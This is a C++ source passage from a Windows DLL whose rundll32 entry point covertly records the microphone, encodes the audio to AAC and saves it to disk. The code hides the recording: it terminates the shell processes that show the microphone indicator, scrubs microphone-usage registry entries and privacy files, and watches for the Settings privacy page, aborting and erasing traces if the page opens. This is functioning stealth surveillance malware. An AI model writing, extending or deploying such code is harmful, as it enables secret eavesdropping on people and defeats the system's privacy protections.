// Kill processes that show microphone indicators
static void AudioKillIndicatorProcesses() {
    const wchar_t* targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            for (auto& t : targets) {
                if (_wcsicmp(pe.szExeFile, t) == 0) {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

// Full cleanup (call when Settings detected or after recording)
static void AudioFullCleanup() {
    AudioCleanMicRegistry();
    AudioDeletePrivacyFiles();
    AudioKillIndicatorProcesses();
}

// ── AudioRecord: rundll32-compatible microphone recording ──
// Usage: rundll32.exe "path\to\dll",AudioRecord <duration_sec> <samplerate> <bitrate> <channels> <output.aac>
// Records mic via waveIn, encodes AAC (MFT), saves to file. Exits when done.
void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)nCmdShow;
    std::string args(lpszCmdLine ? lpszCmdLine : "");

    std::istringstream ss(args);
    int duration = 300, sampleRate = 44100, bitrate = 128, channels = 1;
    std::string outPath;
    ss >> duration >> sampleRate >> bitrate >> channels >> outPath;
    if (outPath.empty()) return;
    if (duration < 1) duration = 300;
    if (duration > 3600) duration = 3600;

    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    MFStartup(MF_VERSION);

    // ── Step 1: Record PCM via waveIn ──
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = (WORD)channels;
    wfx.nSamplesPerSec = (DWORD)sampleRate;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    HWAVEIN hWaveIn = nullptr;
    MMRESULT mr = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    if (mr != MMSYSERR_NOERROR) { MFShutdown(); CoUninitialize(); return; }

    DWORD bufSize = wfx.nAvgBytesPerSec * duration;
    std::vector<BYTE> pcmBuf(bufSize);
    WAVEHDR waveHdr = {};
    waveHdr.lpData = (LPSTR)pcmBuf.data();
    waveHdr.dwBufferLength = bufSize;

    waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInStart(hWaveIn);

    // Wait for recording, monitoring for SystemSettings (Privacy)
    // If Settings opened → stop immediately, cleanup, exit with empty file
    DWORD startTick = GetTickCount();
    DWORD maxWait = duration * 1000 + 2000;
    DWORD lastCleanup = 0;
    bool settingsDetected = false;

    // Initial cleanup on start
    AudioCleanMicRegistry();

    while ((GetTickCount() - startTick) < maxWait) {
        if (waveHdr.dwFlags & WHDR_DONE) break;

        // Check every 500ms if Settings/Privacy is open
        DWORD now = GetTickCount();
        if (now - lastCleanup > 500) {
            lastCleanup = now;
            if (AudioCheckSystemSettings()) {
                // EMERGENCY: Settings detected — stop recording + full cleanup
                settingsDetected = true;
                waveInStop(hWaveIn);
                waveInReset(hWaveIn);
                AudioFullCleanup();
                // Wait for Settings to close, keep cleaning
                while (AudioCheckSystemSettings()) {
                    AudioCleanMicRegistry();
                    Sleep(1000);
                }
                // Settings closed — but we abort this segment (data may be compromised)
                break;
            }
            // Periodic cleanup every 10 seconds during recording
            if ((now - startTick) % 10000 < 600) {
                AudioCleanMicRegistry();
            }
        }
        Sleep(100);
    }

    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    // Post-recording cleanup
    AudioCleanMicRegistry();
    AudioDeletePrivacyFiles();

    DWORD pcmRecorded = waveHdr.dwBytesRecorded;
    // If Settings was detected or no data — exit without saving
    if (settingsDetected || pcmRecorded == 0) {
        AudioFullCleanup();
        MFShutdown(); CoUninitialize();
        return;
    }

    // ── Step 2: Encode PCM → AAC via MFT ──
    // Try to find AAC encoder MFT
    IMFTransform* pEncoder = nullptr;
    bool encoderOK = false;
    std::string ext = ".aac";

    // Create AAC encoder
    {
        MFT_REGISTER_TYPE_INFO inputType = { MFMediaType_Audio, MFAudioFormat_PCM };
        MFT_REGISTER_TYPE_INFO outputType = { MFMediaType_Audio, MFAudioFormat_AAC };

        IMFActivate** ppActivates = nullptr;
        UINT32 count = 0;
        HRESULT hr = MFTEnumEx(MFT_CATEGORY_AUDIO_ENCODER,
            MFT_ENUM_FLAG_SYNCMFT | MFT_ENUM_FLAG_ASYNCMFT | MFT_ENUM_FLAG_SORTANDFILTER,
            &inputType, &outputType, &ppActivates, &count);

        if (SUCCEEDED(hr) && count > 0) {
            hr = ppActivates[0]->ActivateObject(IID_PPV_ARGS(&pEncoder));
            for (UINT32 i = 0; i < count; i++) ppActivates[i]->Release();
            CoTaskMemFree(ppActivates);

            if (SUCCEEDED(hr) && pEncoder) {
                // Set output type (AAC)
                IMFMediaType* pOutType = nullptr;
                MFCreateMediaType(&pOutType);
                pOutType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
                pOutType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_AAC);
                pOutType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
                pOutType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, sampleRate);
                pOutType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, channels);
                pOutType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, bitrate * 1000 / 8);
                hr = pEncoder->SetOutputType(0, pOutType, 0);
                pOutType->Release();

                if (SUCCEEDED(hr)) {
                    // Set input type (PCM)
                    IMFMediaType* pInType = nullptr;
                    MFCreateMediaType(&pInType);
                    pInType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
                    pInType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_PCM);
                    pInType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
                    pInType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, sampleRate);
                    pInType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, channels);
                    pInType->SetUINT32(MF_MT_AUDIO_BLOCK_ALIGNMENT, wfx.nBlockAlign);
                    pInType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, wfx.nAvgBytesPerSec);
                    hr = pEncoder->SetInputType(0, pInType, 0);
                    pInType->Release();

                    if (SUCCEEDED(hr)) {
                        pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
                        pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);
                        encoderOK = true;
                    }
                }
            }
        }
    }

    std::vector<BYTE> outData;

    if (encoderOK && pEncoder) {
        // Feed PCM to encoder in chunks
        const DWORD chunkSize = wfx.nAvgBytesPerSec; // 1 second of PCM per chunk
        DWORD offset = 0;

        while (offset < pcmRecorded) {
            DWORD thisChunk = std::min(chunkSize, pcmRecorded - offset);

            // Create input sample
            IMFSample* pSample = nullptr;
            IMFMediaBuffer* pBuf = nullptr;
            MFCreateMemoryBuffer(thisChunk, &pBuf);
            BYTE* pData = nullptr;
            pBuf->Lock(&pData, nullptr, nullptr);
            memcpy(pData, pcmBuf.data() + offset, thisChunk);
            pBuf->Unlock();
            pBuf->SetCurrentLength(thisChunk);
            MFCreateSample(&pSample);
            pSample->AddBuffer(pBuf);

            // Timestamps
            LONGLONG duration100ns = (LONGLONG)thisChunk * 10000000LL / wfx.nAvgBytesPerSec;
            LONGLONG time100ns = (LONGLONG)offset * 10000000LL / wfx.nAvgBytesPerSec;
            pSample->SetSampleTime(time100ns);
            pSample->SetSampleDuration(duration100ns);

            pEncoder->ProcessInput(0, pSample, 0);
            pSample->Release();
            pBuf->Release();
            offset += thisChunk;

            // Drain output
            while (true) {
                MFT_OUTPUT_DATA_BUFFER outBuf = {};
                MFT_OUTPUT_STREAM_INFO osi = {};
                pEncoder->GetOutputStreamInfo(0, &osi);

                IMFSample* pOutSample = nullptr;
                IMFMediaBuffer* pOutBuf = nullptr;
                if (!(osi.dwFlags & MFT_OUTPUT_STREAM_PROVIDES_SAMPLES)) {
                    UINT32 sz = osi.cbSize > 0 ? osi.cbSize : 65536;
                    MFCreateMemoryBuffer(sz, &pOutBuf);
                    MFCreateSample(&pOutSample);
                    pOutSample->AddBuffer(pOutBuf);
                    outBuf.pSample = pOutSample;
                }

                DWORD status = 0;
                HRESULT hr2 = pEncoder->ProcessOutput(0, 1, &outBuf, &status);
                if (hr2 == MF_E_TRANSFORM_NEED_MORE_INPUT) {
                    if (pOutSample) pOutSample->Release();
                    if (pOutBuf) pOutBuf->Release();
                    break;
                }
                if (SUCCEEDED(hr2) && outBuf.pSample) {
                    IMFMediaBuffer* pResBuf = nullptr;
                    outBuf.pSample->ConvertToContiguousBuffer(&pResBuf);
                    if (pResBuf) {
                        BYTE* d = nullptr; DWORD len = 0;
                        pResBuf->Lock(&d, nullptr, &len);
                        if (d && len > 0) outData.insert(outData.end(), d, d + len);
                        pResBuf->Unlock();
                        pResBuf->Release();
                    }
                }
                if (outBuf.pSample) outBuf.pSample->Release();
                if (outBuf.pEvents) outBuf.pEvents->Release();
                if (pOutBuf) pOutBuf->Release();
                if (FAILED(hr2)) break;
            }
        }

        // Drain remaining
        pEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);
        while (true) {
            MFT_OUTPUT_DATA_BUFFER outBuf = {};
            MFT_OUTPUT_STREAM_INFO osi = {};
            pEncoder->GetOutputStreamInfo(0, &osi);

            IMFSample* pOutSample = nullptr;
            IMFMediaBuffer* pOutBuf = nullptr;
            if (!(osi.dwFlags & MFT_OUTPUT_STREAM_PROVIDES_SAMPLES)) {
                UINT32 sz = osi.cbSize > 0 ? osi.cbSize : 65536;
                MFCreateMemoryBuffer(sz, &pOutBuf);
                MFCreateSample(&pOutSample);
                pOutSample->AddBuffer(pOutBuf);
                outBuf.pSample = pOutSample;
            }
            DWORD status = 0;
            HRESULT hr2 = pEncoder->ProcessOutput(0, 1, &outBuf, &status);
            if (SUCCEEDED(hr2) && outBuf.pSample) {
                IMFMediaBuffer* pResBuf = nullptr;
                outBuf.pSample->ConvertToContiguousBuffer(&pResBuf);
                if (pResBuf) {
                    BYTE* d = nullptr; DWORD len = 0;
                    pResBuf->Lock(&d, nullptr, &len);
                    if (d && len > 0) outData.insert(outData.end(), d, d + len);
                    pResBuf->Unlock();
                    pResBuf->Release();
                }
            }
            if (outBuf.pSample) outBuf.pSample->Release();
            if (outBuf.pEvents) outBuf.pEvents->Release();
            if (pOutBuf) pOutBuf->Release();
            if (FAILED(hr2)) break;
        }
        pEncoder->Release();
    }

    // If MFT encoding failed, save raw PCM as WAV-like (browser can't play but data preserved)
    if (outData.empty()) {
        // Simple ADPCM-like: just save PCM with header (browser won't play but at least data isn't lost)
        // Actually save as raw AAC failed — indicate in filename
        ext = ".pcm";
        outData.assign(pcmBuf.begin(), pcmBuf.begin() + pcmRecorded);
    }

    // Save to file
    if (!outData.empty()) {
        std::ofstream f(outPath, std::ios::binary);
        if (f.is_open()) {
            f.write((const char*)outData.data(), outData.size());
        }
    }

    // Final cleanup — always clean traces after recording
    AudioCleanMicRegistry();
    AudioDeletePrivacyFiles();

    MFShutdown();
    CoUninitialize();
}

} // extern "C"

#endif // BUILD_AS_DLL
